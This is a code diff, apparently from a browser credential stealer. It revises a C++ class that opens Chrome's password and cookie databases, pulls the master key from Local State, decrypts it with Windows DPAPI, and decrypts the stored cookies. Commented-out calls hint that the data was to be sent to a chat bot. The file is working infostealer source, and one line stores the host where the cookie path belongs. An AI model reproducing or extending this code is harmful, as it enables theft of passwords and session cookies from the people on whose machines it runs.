@@ -2,7 +2,8 @@
 
 ChromiumProcessor::ChromiumProcessor()
 {
-    prevMasterKey=nullptr;
+    MasterKey=nullptr;
+    Cookies=new vector <Cookie>;
 #if defined(__WIN64__)
     string appDataLocal_path=std::experimental::filesystem::temp_directory_path().parent_path().parent_path().string();
     userdata_path=appDataLocal_path+string("\\Google\\Chrome\\User Data");
@@ -15,17 +16,22 @@ ChromiumProcessor::ChromiumProcessor()
 #endif
 }
 
-stringstream ChromiumProcessor::getChromiumPW()
+ChromiumProcessor::~ChromiumProcessor()
 {
+    delete Cookies;
+}
+
+stringstream ChromiumProcessor::ExtractChromiumPasswords()
+{
+    cout<<"ChromiumProcessor::getChromiumPW()"<<endl;
     stringstream dump(string(""));
     if(experimental::filesystem::exists(pass_path))
     {
         cout<<"exists"<<pass_path<<endl;
-
-        int rc=sqlite3_open(pass_path.c_str(), &localDB);
+        int rc=sqlite3_open(pass_path.c_str(), &ChromiumDB);
         if(rc!=SQLITE_OK)
         {
-            cerr<<"DB Error: "<<sqlite3_errmsg(localDB)<<endl;
+            cerr<<"DB Error: "<<sqlite3_errmsg(ChromiumDB)<<endl;
             //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
         }
         else
@@ -44,7 +50,7 @@ stringstream ChromiumProcessor::getChromiumPW()
 
     sqlite3_stmt *pStmt;
     int rc, i;
-    rc=sqlite3_prepare(localDB, sql.c_str(), -1, &pStmt, 0);
+    rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
     if (rc!=SQLITE_OK)
     {
         dump<<"statement failed rc="<<rc<<endl;
@@ -84,105 +90,93 @@ stringstream ChromiumProcessor::getChromiumPW()
                 i++;
             }
         }
-        dump<<endl;
         free(encryptedPass.pbData);
         rc=sqlite3_step(pStmt);
     }
     rc=sqlite3_finalize(pStmt);
-    sqlite3_close(localDB);
-    cout<<dump.str();
+    sqlite3_close(ChromiumDB);
     return dump;
 }
 
-stringstream ChromiumProcessor::getChromiumCookies()
+int ChromiumProcessor::ExtractChromiumCookies()
 {
-    cout<<"getChromiumCookies()"<<endl;
+    cout<<"ChromiumProcessor::getChromiumCookies()"<<endl;
     stringstream dump(string(""));
     if(experimental::filesystem::exists(cookies_path))
     {
-        cout<<"exists "<<cookies_path<<endl;
-
-        int rc=sqlite3_open(cookies_path.c_str(), &localDB);
+        //cout<<"exists "<<cookies_path<<endl;
+        int rc=sqlite3_open(cookies_path.c_str(), &ChromiumDB);
         if(rc!=SQLITE_OK)
         {
-            cout<<"DB Error: "<<sqlite3_errmsg(localDB)<<endl;
+            cerr<<"DB Error: "<<sqlite3_errmsg(ChromiumDB)<<endl;
+            return -3;
             //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
         }
-        else
-        {
-            //bot_sender.send(ChatID, cookies.str());
-        }
+        cout<<"DB is Ok."<<endl;
+        //bot_sender.send(ChatID, cookies.str());
     }
     else
     {
-        cerr<<"don't exists"<<cookies_path<<endl;
+        cerr<<"File don't exists"<<cookies_path<<endl;
         throw invalid_argument("wrong cookies_path");
-        return dump;
+        return -2;
     }
+
+    if(MasterKey==nullptr)
+    {
+        this->ExtractChromiumMasterKey();
+    }
+
     string sql="SELECT HOST_KEY, path, encrypted_value FROM cookies";
     sqlite3_stmt *pStmt;
 
     int rc;
-    rc=sqlite3_prepare(localDB, sql.c_str(), -1, &pStmt, 0);
+    rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
     if (rc!=SQLITE_OK)
     {
         cerr<<"sqlite: statement failed, rc="<<rc<<endl;
-        return dump;
+        return -1;
     }
 
     rc=sqlite3_step(pStmt);
     while(rc==SQLITE_ROW)
     {
-        dump<<sqlite3_column_text(pStmt, 0)<<" ";
-        dump<<(char *)sqlite3_column_text(pStmt, 1)<<" ";
+        Cookie newCookie;
+        newCookie.Host=string((char *)sqlite3_column_text(pStmt, 0));
+        newCookie.Path=string((char *)sqlite3_column_text(pStmt, 0));
 
-        DATA_BLOB encryptedCookies;
-        //DATA_BLOB decryptedCookies;
+        DATA_BLOB encryptedCookie;
 
-        encryptedCookies.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
-        encryptedCookies.pbData=new unsigned char[encryptedCookies.cbData];
-        memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), encryptedCookies.cbData);
+        encryptedCookie.cbData=sqlite3_column_bytes(pStmt, 2);
+        encryptedCookie.pbData=new unsigned char[encryptedCookie.cbData];
+        memcpy(encryptedCookie.pbData, sqlite3_column_blob(pStmt, 2), encryptedCookie.cbData);
 
-        string stCookie;
-        stCookie=EasyDecrypt(&encryptedCookies, (unsigned char *)sqlite3_column_blob(pStmt, 11));
-        if(stCookie==string(""))
+        newCookie.Value=EasyDecrypt(&encryptedCookie, MasterKey);
+        if(newCookie.Value==string(""))
         {
-            stCookie=string((char *)encryptedCookies.pbData);
-        }
-        cout<<stCookie;
-/*
-        CryptUnprotectData(&encryptedCookies, NULL, NULL, NULL, NULL, 0, &decryptedCookies);
-        if(decryptedCookies.pbData==nullptr || decryptedCookies.cbData<1)
-        {
-            i=0;
-            while(encryptedCookies.pbData[i])
+            unsigned long int i;
+            string cooDataBuf;
+            for(i=0; encryptedCookie.pbData!=nullptr && i<encryptedCookie.cbData; i++)
             {
-                dump<<encryptedCookies.pbData[i];
-                i++;
+                fprintf(stdout, "%.2x", encryptedCookie.pbData[i]&0xFF);
+                cooDataBuf.append(1, encryptedCookie.pbData[i]&0xFF);
             }
+            fprintf(stdout, " < cookie bin data (%lu bytes)\n", i);
+            newCookie.Value=string((char *)encryptedCookie.pbData);
         }
-        else
-        {
-            i=0;
-            while(decryptedCookies.pbData[i])
-            {
-                dump<<decryptedCookies.pbData[i];
-                i++;
-            }
-        }
-*/
-        delete [] encryptedCookies.pbData;
-        dump<<endl;
+
+        delete [] encryptedCookie.pbData;
+        Cookies->push_back(newCookie);
         rc=sqlite3_step(pStmt);
     }
     rc=sqlite3_finalize(pStmt);
-    sqlite3_close(localDB);
-    cout<<dump.str();
-    return dump;
+    sqlite3_close(ChromiumDB);
+    return 0;
 }
 
-unsigned char *ChromiumProcessor::getMasterKey()
+unsigned char *ChromiumProcessor::ExtractChromiumMasterKey()
 {
+    cout<<"ChromiumProcessor::getMasterKey()"<<endl;
     string LocalStateFile_path=userdata_path, stMasterKey;
     if(LocalStateFile_path.find("Opera")!=string::npos)
     {
@@ -203,8 +197,12 @@ unsigned char *ChromiumProcessor::getMasterKey()
     }
     else
     {
-        return prevMasterKey;
+        if(MasterKey!=nullptr)
+        {
+            return MasterKey;
+        }
     }
+
     json_error_t err;
     json_t *LocalState=json_load_file(LocalStateFile_path.c_str(), 0, &err);
     if(LocalState == NULL)
@@ -235,30 +233,30 @@ unsigned char *ChromiumProcessor::getMasterKey()
     }
     fprintf(stdout, "' (hex format, encrypted)\n");
 
-    unsigned int len=stMasterKey.length()-5;
+    unsigned int keyLen=stMasterKey.length()-5;
     DATA_BLOB bRawMasterKey;
-    bRawMasterKey.cbData=len;
-    bRawMasterKey.pbData=new unsigned char[len];
-    memcpy(bRawMasterKey.pbData, stMasterKey.data()+5, len);
+    bRawMasterKey.cbData=keyLen;
+    bRawMasterKey.pbData=new unsigned char[keyLen];
+    memcpy(bRawMasterKey.pbData, &stMasterKey.data()[5], keyLen);
 
     DATA_BLOB finalK=DPAPIDecrypt(&bRawMasterKey);
     if(finalK.cbData>0)
     {
-        if(prevMasterKey!=nullptr)
+        if(MasterKey!=nullptr)
         {
-            delete [] prevMasterKey;
+            delete [] MasterKey;
         }
-        prevMasterKey=new unsigned char[finalK.cbData];
-        memcpy(prevMasterKey, finalK.pbData, finalK.cbData);
+        MasterKey=new unsigned char[finalK.cbData];
+        memcpy(MasterKey, finalK.pbData, finalK.cbData);
     }
     delete [] bRawMasterKey.pbData;
 
     fprintf(stdout, "Chromium MasterKey: '");
     for(unsigned long int i=0; i<finalK.cbData; i++)
     {
-        fprintf(stdout, "%.2x", prevMasterKey[i]&0xFF);
+        fprintf(stdout, "%.2x", MasterKey[i]&0xFF);
     }
     fprintf(stdout, "' (hex format, decrypted)\n");
 
-    return prevMasterKey;
+    return MasterKey;
 }
